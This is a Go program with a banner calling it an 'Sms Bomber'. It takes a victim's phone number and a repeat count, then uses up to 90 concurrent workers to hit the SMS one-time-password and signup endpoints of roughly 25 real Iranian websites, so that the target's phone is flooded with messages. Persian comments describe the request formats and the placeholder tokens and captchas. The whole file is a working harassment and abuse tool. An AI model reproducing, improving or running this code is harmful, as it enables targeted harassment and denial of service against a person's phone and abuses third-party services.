// faghat teste code
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"  
        "net/http/cookiejar"  
)
//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
//Code by @monsmain
func sendFormRequest(client *http.Client, ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second // کمی کمتر از POST برای GET

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // متد GET و Body = nil
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
	}
}//Code by @monsmain
//(faghat baraye site payagym.com)
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p) 
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p 
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}
func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 
//Code by @monsmain
	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 90 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 40 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 40 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}//Code by @monsmain


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
        Timeout: 10 * time.Second,
	}

	tasks := make(chan func(), repeatCount*40)

	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*40)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {
// alibaba.ir (OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phoneNumber": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", payload, &wg, ch)
			}
		}(client)

		// football360.ir verify-phone (Check - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phone_number": getPhoneNumberPlus98NoZero(phone), // فرمت +989...
				}
				sendJSONRequest(c, ctx, "https://football360.ir/api/auth/v2/verify-phone/", payload, &wg, ch)
			}
		}(client)

		// football360.ir send_otp (OTP - POST JSON)
		// توجه: این نقطه پایانی نیاز به "otp_token" دارد که احتمالا از "verify-phone" یا مرحله قبل دریافت می شود و در یک حلقه ساده کار نکند.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phone_number": getPhoneNumberPlus98NoZero(phone), // فرمت +989...
					"otp_token": "PLACEHOLDER_OTP_TOKEN", // نیاز به توکن پویا
					"auto_read_platform": "ST", // مقدار ثابت
				}
				sendJSONRequest(c, ctx, "https://football360.ir/api/auth/v2/send_otp/", payload, &wg, ch)
			}
		}(client)


		// pubg-sell.ir (Login/OTP - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("username", phone) // فرمت 09...
				sendFormRequest(c, ctx, "https://pubg-sell.ir/loginuser", formData, &wg, ch)
			}
		}(client)

		// api.vandar.io (Check/OTP - POST JSON)
		// توجه: این نقطه پایانی نیاز به "captcha" دارد که بدون حل کپچا کار نخواهد کرد.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile": phone, // فرمت 09...
					"captcha": "PLACEHOLDER_CAPTCHA_RESPONSE", // نیاز به حل کپچا
					"captcha_provider": "CLOUDFLARE", // مقدار ثابت
				}
				sendJSONRequest(c, ctx, "https://api.vandar.io/account/v1/check/mobile", payload, &wg, ch)
			}
		}(client)

		// safarmarket.com is_phone_available (Check - GET Query)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				// پارامتر phone مستقیماً در URL قرار می گیرد
				urlWithQuery := fmt.Sprintf("https://safarmarket.com//api/security/v1/user/is_phone_available?phone=%s", url.QueryEscape(phone))
				sendGETRequest(c, ctx, urlWithQuery, &wg, ch)
			}
		}(client)

		// safarmarket.com otp (OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phone": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://safarmarket.com//api/security/v2/user/otp", payload, &wg, ch)
			}
		}(client)

		// app.inchand.com initialize (OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://app.inchand.com/api/v1/authentication/initialize", payload, &wg, ch)
			}
		}(client)

		// bikoplus.com check-phone-number (Check - GET Query)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				// پارامتر phoneNumber مستقیماً در URL قرار می گیرد
				urlWithQuery := fmt.Sprintf("https://bikoplus.com/api/client/v3/authentications/check-phone-number?phoneNumber=%s", url.QueryEscape(phone))
				sendGETRequest(c, ctx, urlWithQuery, &wg, ch)
			}
		}(client)

		// adinehbook.com sign-in (Login/OTP - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				// فیلدهای دیگر از نمونه درخواست کاربر
				formData.Set("path", "") // مقدار پیش فرض
				formData.Set("action", "sign") // مقدار ثابت
				formData.Set("phone_cell_or_email", phone) // فرمت 09...
				formData.Set("login-submit", "تایید") // مقدار ثابت (ممکن است نیاز نباشد)
				sendFormRequest(c, ctx, "https://www.adinehbook.com/gp/flex/sign-in.html", formData, &wg, ch)
			}
		}(client)

		// maxbax.com send_code (OTP - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "bakala_send_code") // مقدار ثابت
				formData.Set("phone_email", phone) // فرمت 09...
				sendFormRequest(c, ctx, "https://maxbax.com/bakala/ajax/send_code/", formData, &wg, ch)
			}
		}(client)

		// nalinoco.com login-register (OTP - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("step", "1") // مقدار ثابت
				formData.Set("ReturnUrl", "/") // مقدار ثابت
				formData.Set("mobile", phone) // فرمت 09...
				sendFormRequest(c, ctx, "https://www.nalinoco.com/api/customers/login-register", formData, &wg, ch)
			}
		}(client)

		// kapanigold.com admin-ajax.php (OTP - POST Form)
		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
		// توجه: csrf و dig_nounce ممکن است پویا باشند.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob") // مقدار ثابت
				formData.Set("countrycode", "+98") // مقدار ثابت
				formData.Set("mobileNo", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("csrf", "PLACEHOLDER_CSRF") // نیاز به مقدار پویا
				formData.Set("login", "1") // مقدار ثابت
				formData.Set("username", "") // مقدار پیش فرض
				formData.Set("email", "") // مقدار پیش فرض
				formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
				formData.Set("captcha_ses", "") // ممکن است نیاز به کپچا داشته باشد
				formData.Set("digits", "1") // مقدار ثابت
				formData.Set("json", "1") // مقدار ثابت
				formData.Set("whatsapp", "0") // مقدار ثابت
				formData.Set("mobmail", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("dig_otp", "") // مقدار پیش فرض
				formData.Set("dig_nounce", "PLACEHOLDER_DIG_NOUNCE") // نیاز به مقدار پویا
				sendFormRequest(c, ctx, "https://kapanigold.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// lavinbg.com admin-ajax.php (Login/OTP - POST Form)
		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
		// توجه: instance_id, digits_form, _wp_http_referer ممکن است پویا باشند.
		// این نقطه پایانی به نظر بخشی از فرآیند ورود/ثبت نام است و ممکن است به تنهایی OTP ارسال نکند.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("login_digt_countrycode", "+98") // مقدار ثابت
				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("digits_email", "") // مقدار پیش فرض
				formData.Set("action_type", "phone") // مقدار ثابت
				formData.Set("rememberme", "1") // مقدار ثابت
				formData.Set("digits", "1") // مقدار ثابت
				formData.Set("instance_id", "PLACEHOLDER_INSTANCE_ID") // نیاز به مقدار پویا
				formData.Set("action", "digits_forms_ajax") // مقدار ثابت
				formData.Set("type", "login") // مقدار ثابت (توجه: نوع login است نه register)
				// فیلدهای دیگر از نمونه درخواست کاربر
				formData.Set("digits_step_1_type", "")
				formData.Set("digits_step_1_value", "")
				formData.Set("digits_step_2_type", "")
				formData.Set("digits_step_2_value", "")
				formData.Set("digits_step_3_type", "")
				formData.Set("digits_step_3_value", "")
				formData.Set("digits_login_email_token", "")
				formData.Set("digits_redirect_page", "//lavinbg.com/?page=2&redirect_to=https%3A%2F%2Flavinbg.com%2F") // مقدار ثابت
				formData.Set("digits_form", "PLACEHOLDER_DIGITS_FORM") // نیاز به مقدار پویا
				formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد یا نیاز به URL کامل داشته باشد
				formData.Set("show_force_title", "1") // مقدار ثابت
				sendFormRequest(c, ctx, "https://lavinbg.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// mofidteb.com auth (Login/OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"username": phone, // فرمت 09...
					"terms_accepted": true, // مقدار ثابت
				}
				sendJSONRequest(c, ctx, "https://mofidteb.com/api/auth/auth", payload, &wg, ch)
			}
		}(client)

		// webpoosh.com register (Registration/OTP - POST Form)
		// توجه: _token ممکن است پویا باشد.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("_token", "PLACEHOLDER_TOKEN") // نیاز به مقدار پویا
				formData.Set("cellphone", phone) // فرمت 09...
				sendFormRequest(c, ctx, "https://www.webpoosh.com/register", formData, &wg, ch)
			}
		}(client)

		// masterkala.com otp (OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"type": "sendotp", // مقدار ثابت
					"phone": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp", payload, &wg, ch)
			}
		}(client)

		// sensishopping.com admin-ajax.php (OTP - POST Form)
		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
		// توجه: csrf, instance_id, digits_form, _wp_http_referer ممکن است پویا باشند.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob") // مقدار ثابت
				formData.Set("countrycode", "+98") // مقدار ثابت
				// این نمونه از یک فاصله در شماره تلفن استفاده کرده بود، اما بهتر است از شماره تمیز استفاده شود
				formData.Set("mobileNo", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("csrf", "PLACEHOLDER_CSRF") // نیاز به مقدار پویا
				formData.Set("login", "1") // مقدار ثابت
				formData.Set("username", "") // مقدار پیش فرض
				formData.Set("email", "") // مقدار پیش فرض
				formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
				formData.Set("captcha_ses", "") // ممکن است نیاز به کپچا داشته باشد
				formData.Set("digits", "1") // مقدار ثابت
				formData.Set("json", "1") // مقدار ثابت
				formData.Set("whatsapp", "0") // مقدار ثابت
				formData.Set("mobmail", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("dig_otp", "") // مقدار پیش فرض
				formData.Set("dig_nounce", "PLACEHOLDER_DIG_NOUNCE") // نیاز به مقدار پویا
				sendFormRequest(c, ctx, "https://sensishopping.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// gruccia.ir login (Login/Register - POST Form)
		// مشابه dolichi.com
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("back", "my-account")
				formData.Set("username", phone) // فرمت 09...
				// فیلدهای دیگر از نمونه درخواست کاربر
				formData.Set("id_customer", "") // مقدار پیش فرض
				formData.Set("firstname", "نام") // مقدار نمونه
				formData.Set("lastname", "خانوادگی") // مقدار نمونه
				// نمونه ایمیل و پسورد در این یکی نبود، اما برای register احتمالا لازم است
				// formData.Set("email", "example@example.com")
				// formData.Set("password", "1234567890")
				formData.Set("action", "register") // مقدار ثابت
				formData.Set("ajax", "1") // مقدار ثابت
				sendFormRequest(c, ctx, "https://gruccia.ir/login?back=my-account", formData, &wg, ch)
			}
		}(client)

		// mobilexpress.ir admin-ajax.php (POST Form - Step 1 Login check)
		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
		// توجه: instance_id, digits_form, _wp_http_referer ممکن است پویا باشند.
		// این نقطه پایانی به نظر بخشی از فرآیند ورود/ثبت نام است و ممکن است به تنهایی OTP ارسال نکند.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("login_digt_countrycode", "+98") // مقدار ثابت
				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("action_type", "phone") // مقدار ثابت
				formData.Set("digits", "1") // مقدار ثابت
				formData.Set("instance_id", "PLACEHOLDER_INSTANCE_ID") // نیاز به مقدار پویا
				formData.Set("action", "digits_forms_ajax") // مقدار ثابت
				formData.Set("type", "login") // مقدار ثابت
				// فیلدهای دیگر از نمونه درخواست کاربر
				formData.Set("digits_step_1_type", "")
				formData.Set("digits_step_1_value", "")
				formData.Set("digits_step_2_type", "")
				formData.Set("digits_step_2_value", "")
				formData.Set("digits_step_3_type", "")
				formData.Set("digits_step_3_value", "")
				formData.Set("digits_login_email_token", "")
				formData.Set("digits_redirect_page", "//mobilexpress.ir/") // مقدار ثابت
				formData.Set("digits_form", "PLACEHOLDER_DIGITS_FORM") // نیاز به مقدار پویا
				formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد یا نیاز به URL کامل داشته باشد
				formData.Set("show_force_title", "1") // مقدار ثابت
				sendFormRequest(c, ctx, "https://mobilexpress.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// mobilexpress.ir admin-ajax.php (POST Form - Step 2 Register/Send OTP)
		// این نقطه پایانی به نظر مرحله دوم ثبت نام یا ارسال OTP است.
		// نیاز به فیلدهای مشابه مرحله 1 و احتمالا توکن ها یا کوکی های آن مرحله دارد.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("login_digt_countrycode", "+98") // مقدار ثابت
				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
				formData.Set("action_type", "phone") // مقدار ثابت
				formData.Set("digits_reg_name", "testname") // مقدار نمونه
				formData.Set("digits_process_register", "1") // مقدار ثابت
				formData.Set("sms_otp", "") // مقدار پیش فرض
				formData.Set("digits_otp_field", "1") // مقدار ثابت
				formData.Set("digits", "1") // مقدار ثابت
				formData.Set("instance_id", "PLACEHOLDER_INSTANCE_ID") // نیاز به مقدار پویا (احتمالا همان مرحله 1)
				formData.Set("action", "digits_forms_ajax") // مقدار ثابت
				formData.Set("type", "login") // مقدار ثابت (هنوز نوع login است)
				// فیلدهای دیگر از نمونه درخواست کاربر
				formData.Set("digits_step_1_type", "")
				formData.Set("digits_step_1_value", "")
				formData.Set("digits_step_2_type", "")
				formData.Set("digits_step_2_value", "")
				formData.Set("digits_step_3_type", "")
				formData.Set("digits_step_3_value", "")
				formData.Set("digits_login_email_token", "")
				formData.Set("digits_redirect_page", "//mobilexpress.ir/") // مقدار ثابت
				formData.Set("digits_form", "PLACEHOLDER_DIGITS_FORM") // نیاز به مقدار پویا (احتمالا همان مرحله 1)
				formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد یا نیاز به URL کامل داشته باشد
				formData.Set("show_force_title", "1") // مقدار ثابت
				formData.Set("container", "digits_protected") // مقدار ثابت
				formData.Set("sub_action", "sms_otp") // مقدار ثابت
				sendFormRequest(c, ctx, "https://mobilexpress.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// api.beroozmart.com check-user (Check - POST JSON)
		// این نقطه پایانی به نظر مرحله چک کردن وجود کاربر است و ممکن است به تنهایی OTP ارسال نکند.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"username": getPhoneNumberPlus98NoZero(phone), // فرمت +989...
				}
				sendJSONRequest(c, ctx, "https://api.beroozmart.com/api/pub/account/check-user", payload, &wg, ch)
			}
		}(client)

		// api.beroozmart.com send-otp (OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile": phone, // فرمت 09...
					"sendViaSms": true, // مقدار ثابت
					"email": nil, // مقدار ثابت
					"sendViaEmail": false, // مقدار ثابت
				}
				sendJSONRequest(c, ctx, "https://api.beroozmart.com/api/pub/account/send-otp", payload, &wg, ch)
			}
		}(client)

		// 2nabsh.com checkUsername (Check - POST Form)
		// توجه: _token ممکن است پویا باشد. این نقطه پایانی به نظر مرحله چک کردن نام کاربری است.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("username", phone) // فرمت 09...
				formData.Set("just_verify_mobile", "false") // مقدار ثابت
				formData.Set("_token", "PLACEHOLDER_TOKEN") // نیاز به مقدار پویا
				sendFormRequest(c, ctx, "https://www.2nabsh.com/auth/checkUsername", formData, &wg, ch)
			}
		}(client)

		// api.sibche.com sendCode (OTP - POST JSON)
		// توجه: نیاز به "g-recaptcha-response" دارد که بدون حل کپچا کار نخواهد کرد.
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile": phone, // فرمت 09...
					"spec-g": nil, // مقدار ثابت
					"g-recaptcha-response": "PLACEHOLDER_RECAPTCHA_RESPONSE", // نیاز به حل کپچا
				}
				sendJSONRequest(c, ctx, "https://api.sibche.com/profile/sendCode", payload, &wg, ch)
			}
		}(client)


                    }
		
//Code by @monsmain
	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
//Code by @monsmain
